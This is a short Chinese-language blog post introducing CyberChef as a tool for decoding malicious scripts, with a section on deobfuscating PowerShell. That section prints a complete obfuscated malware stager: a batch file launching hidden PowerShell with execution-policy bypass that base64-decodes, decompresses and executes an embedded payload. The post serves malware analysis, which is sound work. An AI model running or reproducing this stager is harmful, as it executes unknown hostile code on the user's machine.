+++
title = '数据处理神器Cyberchef使用指南'

description = "妈妈再也不用担心我不会编码解码了"

tags = [ "技术" ]

date = 2024-07-10T10:05:48+08:00

+++

**CyberChef**是一款强大的编码转换器，下载地址在

[CyberChef]: https://github.com/gchq/CyberChef

它简单易懂易上手，集成了多种编码转换的功能，如：base64加解密、hex转换、char转换、正则表达式等，能辅助大家方便快捷地解密出恶意脚本。

其界面如下图，最左边的Operations是转换工具集，把挑选好的工具经过DIY组合及排序拖拽到Recipe中，就可以对Input中的字符串进行相应地解密操作了，工具很多，可以在Search框中搜索，输出结果会打印在Output窗口中。

![](https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/c556944c75a7b69779f8f7f469cef859.png)

#### 反混淆Powershell代码

```
@echo off
if %PROCESSOR_ARCHITECTURE%==x86 (powershell.exe -NoP -NonI -W Hidden -Command "Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\"nVRtc9pGEP7Or9jRXGekMRIyENdG45k4OG7cBocax07LMJ1DWtCF0518OvFiwn/vCquYfO0XnXa1t8+zu8+KPcMlvHca42spb7NcG+s6CzQKZacdJFI63gTycipFDIXllg5cW/oOt8oOrYFHYWzJ5ZWUOnZrn8yvksRgUTShFMpCshqJF6yN2WsspdLqYZO/uYdGW4ytF/1vLn2D3OJDSkfyxuXVvrLWiGlp8YiU5fHildkhmHzGHtgf3ENueIaEdbi8x6ISbiSfH0e+ot0mVIbzvmHNZssS6rBz9aF//fHmt0+3v//xeXD3Zfjn/ejh6+PTt7/+5tM4wdk8Fd8XMlM6fzaFLZer9eYlPG13uu/Ofj2/cIIH3U+5uTKGb1yvMStVXKFD7LKltwWDtqQ+uO6Y2I0nE2DLn2/ADxggL0qD/pfpd2oz+KMy8wJ6wC8Qrk/DEHx8hou2t3vLbmHLZhV7JzoNgs6Pmabi4tTX+xT07eQSWDJ252h9w1WiM/AzvhYZZWVJ8BnV3KbeZBfV/NgsOsqOsIXc6JhaDdsxr4hO2Jrg6HEC7J9dBKgSorAm9gWpocaFratw9Z9xv8f1AkVacL3d7ghgvgViDC4Tl2HEBPjSwlmX3k5OvC1LCclGbFEBJoSAEUBdIF2RIIjvguKKKiCtGMkIxAxc6nnheXDoOkUQbG04F8tvXx0qc3yHNhihWYoYh5rGMuCKz9FMer3Ki6aPxoqZoE3ARy5FspdTn0s5JVkS5pZZU+IuYhkZd1RwPbjRprCYBVX6J5z2pUBlowbLgk8kPDRFQPJ1nbJA4xOesk4TnIF+EVLyVjcIib/OcgKbSqp4MLr9CGfBaQRPgvq4KuDuwXO8iCkCnUcw/rCxuBdUXrUhC671SknNk2tuueuk1uZFr9XqvAvaYTc4bwdnF71ut9Mqc6oHW0w54DWYprvEyq/2nRSC2RTNNc6EEvs5sWfw72i/wCESnbYDviKryHmMsPfc1BMtwM95UdjUlA22vmS61/vp/xM2WV6rrhmuO2EY0tENvWhcN+2+VFZkGNC6otF5PZ4iGHBTpFzSbPo637gsb0LYhPHrVk9ctqZtIqPTdj2vCQeQqjS6cvzbIcQmWzerI6y2TpfWV6Uk6ex/Lf5IIua0fBhr0vb5WTcMdySBON3u/gU=\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();") else (%WinDir%\syswow64\windowspowershell\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\"nVRtc9pGEP7Or9jRXGekMRIyENdG45k4OG7cBocax07LMJ1DWtCF0518OvFiwn/vCquYfO0XnXa1t8+zu8+KPcMlvHca42spb7NcG+s6CzQKZacdJFI63gTycipFDIXllg5cW/oOt8oOrYFHYWzJ5ZWUOnZrn8yvksRgUTShFMpCshqJF6yN2WsspdLqYZO/uYdGW4ytF/1vLn2D3OJDSkfyxuXVvrLWiGlp8YiU5fHildkhmHzGHtgf3ENueIaEdbi8x6ISbiSfH0e+ot0mVIbzvmHNZssS6rBz9aF//fHmt0+3v//xeXD3Zfjn/ejh6+PTt7/+5tM4wdk8Fd8XMlM6fzaFLZer9eYlPG13uu/Ofj2/cIIH3U+5uTKGb1yvMStVXKFD7LKltwWDtqQ+uO6Y2I0nE2DLn2/ADxggL0qD/pfpd2oz+KMy8wJ6wC8Qrk/DEHx8hou2t3vLbmHLZhV7JzoNgs6Pmabi4tTX+xT07eQSWDJ252h9w1WiM/AzvhYZZWVJ8BnV3KbeZBfV/NgsOsqOsIXc6JhaDdsxr4hO2Jrg6HEC7J9dBKgSorAm9gWpocaFratw9Z9xv8f1AkVacL3d7ghgvgViDC4Tl2HEBPjSwlmX3k5OvC1LCclGbFEBJoSAEUBdIF2RIIjvguKKKiCtGMkIxAxc6nnheXDoOkUQbG04F8tvXx0qc3yHNhihWYoYh5rGMuCKz9FMer3Ki6aPxoqZoE3ARy5FspdTn0s5JVkS5pZZU+IuYhkZd1RwPbjRprCYBVX6J5z2pUBlowbLgk8kPDRFQPJ1nbJA4xOesk4TnIF+EVLyVjcIib/OcgKbSqp4MLr9CGfBaQRPgvq4KuDuwXO8iCkCnUcw/rCxuBdUXrUhC671SknNk2tuueuk1uZFr9XqvAvaYTc4bwdnF71ut9Mqc6oHW0w54DWYprvEyq/2nRSC2RTNNc6EEvs5sWfw72i/wCESnbYDviKryHmMsPfc1BMtwM95UdjUlA22vmS61/vp/xM2WV6rrhmuO2EY0tENvWhcN+2+VFZkGNC6otF5PZ4iGHBTpFzSbPo637gsb0LYhPHrVk9ctqZtIqPTdj2vCQeQqjS6cvzbIcQmWzerI6y2TpfWV6Uk6ex/Lf5IIua0fBhr0vb5WTcMdySBON3u/gU=\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();")
```

